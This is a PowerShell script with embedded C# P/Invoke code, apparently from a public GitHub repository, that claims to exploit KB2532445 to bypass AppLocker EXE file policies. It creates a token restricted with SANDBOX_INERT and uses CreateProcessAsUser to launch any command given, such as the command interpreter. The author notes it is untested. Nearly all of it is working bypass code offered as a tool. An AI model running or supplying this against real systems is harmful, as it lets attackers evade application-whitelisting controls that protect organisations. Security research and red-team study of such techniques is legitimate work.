function Invoke-SchmappLocker {
<#
.SYNOPSIS

This script exploits KB2532445 via the CreateRestrictedToken function and
corresponding SANDBOX_INERT flag. Or does it? I haven't had a chance to test
it.

.DESCRIPTION

Bypasses AppLocker EXE file policies.

.PARAMETER cmdline

Mandatory, the full path to the command to execute.

.EXAMPLE

Invoke-SchmappLocker $env:comspec
Execute the command interpreter

.LINK

Blog: http://baileysoriginalirishtech.blogspot.com/
Github repo: https://github.com/strictlymike/Invoke-SchmappLocker

Blog on PowerShell P/Invoke: http://blogs.technet.com/b/heyscriptingguy/archive/2013/10/19/weekend-scripter-use-powershell-and-pinvoke-to-remove-stubborn-files.aspx

#>
	[CmdletBinding()]
	param (
		[parameter(Mandatory=$true,ValueFromPipeline=$true)]
		[string[]]$cmdline
	)
	PROCESS
	{
		Add-Type @"
using System;
using System.Text;
using System.Runtime.InteropServices;

public class SchmappLocker
{
	// GetCurrentProcess
	[DllImport("kernel32.dll")]
	static extern IntPtr GetCurrentProcess();

	// OpenProcessToken
	[DllImport("advapi32.dll", SetLastError=true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	static extern bool OpenProcessToken(IntPtr ProcessHandle,
		UInt32 DesiredAccess, out IntPtr TokenHandle);

	private static uint STANDARD_RIGHTS_REQUIRED = 0x000F0000;
	private static uint STANDARD_RIGHTS_READ = 0x00020000;
	private static uint TOKEN_ASSIGN_PRIMARY = 0x0001;
	private static uint TOKEN_DUPLICATE = 0x0002;
	private static uint TOKEN_IMPERSONATE = 0x0004;
	private static uint TOKEN_QUERY = 0x0008;
	private static uint TOKEN_QUERY_SOURCE = 0x0010;
	private static uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
	private static uint TOKEN_ADJUST_GROUPS = 0x0040;
	private static uint TOKEN_ADJUST_DEFAULT = 0x0080;
	private static uint TOKEN_ADJUST_SESSIONID = 0x0100;
	private static uint TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY);
	private static uint TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
		TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
		TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
		TOKEN_ADJUST_SESSIONID);

	// CreateRestrictedToken
	[DllImport("advapi32.dll", SetLastError=true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	static extern bool CreateRestrictedToken(
		IntPtr ExistingTokenHandle,
		UInt32 Flags,
		UInt32 DisableSidCount,
		IntPtr SidsToDisable,
		UInt32 DeletePrivilegeCount,
		IntPtr PrivilegesToDelete,
		UInt32 RestrictedSidCount,
		IntPtr SidsToRestrict,
		out IntPtr NewTokenHandle
	);

	// private static uint DISABLE_MAX_PRIVILEGE = 0x1;
	private static uint SANDBOX_INERT = 0x2;
	// private static uint LUA_TOKEN = 0x4;
	// private static uint WRITE_RESTRICTED = 0x8;

	// CreateProcessAsUser
	[DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Auto)]
	static extern bool CreateProcessAsUser(
		IntPtr hToken,
		string lpApplicationName,
		/* Hacky */ IntPtr lpCommandLine,
		IntPtr lpProcessAttributes,
		IntPtr lpThreadAttributes,
		bool bInheritHandles,
		uint dwCreationFlags,
		IntPtr lpEnvironment,
		/* So hacky */ IntPtr lpCurrentDirectory,
		ref STARTUPINFO lpStartupInfo,
		out PROCESS_INFORMATION lpProcessInformation
	);

	[StructLayout(LayoutKind.Sequential)]
	internal struct PROCESS_INFORMATION
	{
	   public IntPtr hProcess;
	   public IntPtr hThread;
	   public int dwProcessId;
	   public int dwThreadId;
	}

	[StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
	struct STARTUPINFO
	{
		public Int32 cb;
		public string lpReserved;
		public string lpDesktop;
		public string lpTitle;
		public Int32 dwX;
		public Int32 dwY;
		public Int32 dwXSize;
		public Int32 dwYSize;
		public Int32 dwXCountChars;
		public Int32 dwYCountChars;
		public Int32 dwFillAttribute;
		public Int32 dwFlags;
		public Int16 wShowWindow;
		public Int16 cbReserved2;
		public IntPtr lpReserved2;
		public IntPtr hStdInput;
		public IntPtr hStdOutput;
		public IntPtr hStdError;
	}

	static public int Run(string cmdline)
	{
		IntPtr CurrentProc;
		IntPtr Token;
		IntPtr NewToken;
		STARTUPINFO si = new STARTUPINFO();
		PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
		bool Ok;

		CurrentProc = GetCurrentProcess();

		Ok = OpenProcessToken(CurrentProc, TOKEN_ALL_ACCESS, out Token);

		if (!Ok)
		{
			Console.WriteLine("OpenProcessToken failed\n");
			return 1;
		}

		Ok = CreateRestrictedToken(
			Token,
			SANDBOX_INERT,
			0,
			IntPtr.Zero,
			0,
			IntPtr.Zero,
			0,
			IntPtr.Zero,
			out NewToken
		   );

		if (!Ok)
		{
			Console.WriteLine("CreateRestrictedToken failed\n");
			return 1;
		}

		Ok = CreateProcessAsUser(
			NewToken,
			cmdline,
			IntPtr.Zero,
			IntPtr.Zero,
			IntPtr.Zero,
			true,
			0,
			IntPtr.Zero,
			IntPtr.Zero,
			ref si,
			out pi
		   );

		if (!Ok)
		{
			Console.WriteLine(
				"CreateProcessAsUser failed, {0}\n",
				Marshal.GetLastWin32Error()
			   );
			return 1;
		}

		return 0;
	}
}
"@

		[SchmappLocker]::Run($cmdline)
	}
}
